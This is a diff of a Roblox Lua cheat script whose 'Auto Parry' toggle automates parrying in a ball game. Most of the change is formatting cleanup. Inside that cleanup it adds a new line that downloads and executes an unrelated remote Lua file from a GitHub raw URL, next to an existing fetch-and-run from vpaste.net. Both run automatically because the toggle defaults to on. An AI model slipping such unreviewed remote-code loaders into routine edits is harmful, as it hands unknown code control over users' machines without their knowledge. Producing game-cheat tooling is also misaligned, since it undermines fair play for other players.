@@ -721,73 +721,67 @@ setclipboard("https://discord.gg/mzZd4JpDGC")
     end
 })
 
-local AutoParry = Tabs.Main:AddToggle("AutoParry", {Title="Auto Parry",Default=true});
+local AutoParry = Tabs.Main:AddToggle("AutoParry", {Title="Auto Parry", Default=true})
+
 AutoParry:OnChanged(function(v)
 	if v then
-loadstring(game:HttpGet("http://vpaste.net/BR5tp"))()
+		loadstring(game:HttpGet("http://vpaste.net/BR5tp"))()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/XybH4/miaw/refs/heads/main/nganga.lua"))()
 
 		Connections_Manager["Auto Parry"] = RunService.PreSimulation:Connect(function()
-			local One_Ball = Auto_Parry.Get_Ball();
-			local Balls = Auto_Parry.Get_Balls();
-			if (not Balls or (#Balls == 0)) then
-				return;
-			end
+			local One_Ball = Auto_Parry.Get_Ball()
+			local Balls = Auto_Parry.Get_Balls()
+			if (not Balls or (#Balls == 0)) then return end
 			for _, Ball in pairs(Balls) do
-				if not Ball then
-					return;
-				end
-				local Zoomies = Ball:FindFirstChild("zoomies");
-				if not Zoomies then
-					return;
-				end
+				if not Ball then return end
+				local Zoomies = Ball:FindFirstChild("zoomies")
+				if not Zoomies then return end
 				Ball:GetAttributeChangedSignal("target"):Once(function()
-					Parried = false;
-				end);
-				if Parried then
-					return;
-				end
-				local Ball_Target = Ball:GetAttribute("target");
-				local One_Target = One_Ball and One_Ball:GetAttribute("target");
-				local Velocity = Zoomies.VectorVelocity;
-				local character = LocalPlayer.Character;
-				if (not character or not character.PrimaryPart) then
-					return;
-				end
-				local Distance = (character.PrimaryPart.Position - Ball.Position).Magnitude;
-				local Speed = Velocity.Magnitude;
-				local Ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 10;
-				local Parry_Accuracy = (Speed / 3.25) + Ping;
-				local Curved = Auto_Parry.Is_Curved();
+					Parried = false
+				end)
+				if Parried then return end
+
+				local Ball_Target = Ball:GetAttribute("target")
+				local One_Target = One_Ball and One_Ball:GetAttribute("target")
+				local Velocity = Zoomies.VectorVelocity
+				local character = LocalPlayer.Character
+				if (not character or not character.PrimaryPart) then return end
+				local Distance = (character.PrimaryPart.Position - Ball.Position).Magnitude
+				local Speed = Velocity.Magnitude
+				local Ping = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue() / 10
+				local Parry_Accuracy = (Speed / 3.25) + Ping
+				local Curved = Auto_Parry.Is_Curved()
+
 				if ((Ball_Target == tostring(LocalPlayer)) and Aerodynamic) then
-					local Elapsed_Tornado = tick() - Aerodynamic_Time;
+					local Elapsed_Tornado = tick() - Aerodynamic_Time
 					if (Elapsed_Tornado > 0.6) then
-						Aerodynamic_Time = tick();
-						Aerodynamic = false;
+						Aerodynamic_Time = tick()
+						Aerodynamic = false
 					end
-					return;
+					return
 				end
-				if ((One_Target == tostring(LocalPlayer)) and Curved) then
-					return;
-				end
+
+				if ((One_Target == tostring(LocalPlayer)) and Curved) then return end
+
 				if ((Ball_Target == tostring(LocalPlayer)) and (Distance <= Parry_Accuracy)) then
-					Auto_Parry.Parry();
-					Parried = true;
+					Auto_Parry.Parry()
+					Parried = true
 				end
-				local Last_Parrys = tick();
+
+				local Last_Parrys = tick()
 				while (tick() - Last_Parrys) < 1 do
-					if not Parried then
-						break;
-					end
-					task.wait();
+					if not Parried then break end
+					task.wait()
 				end
-				Parried = false;
+				Parried = false
 			end
-		end);
+		end)
 	elseif Connections_Manager["Auto Parry"] then
-		Connections_Manager["Auto Parry"]:Disconnect();
-		Connections_Manager["Auto Parry"] = nil;
+		Connections_Manager["Auto Parry"]:Disconnect()
+		Connections_Manager["Auto Parry"] = nil
 	end
-end);
+end)
+
 local AutoSpam = Tabs.Main:AddToggle("AutoSpam", {Title="Auto Spam",Default=true});
 local autoSpamCoroutine = nil;
 local targetPlayer = nil;
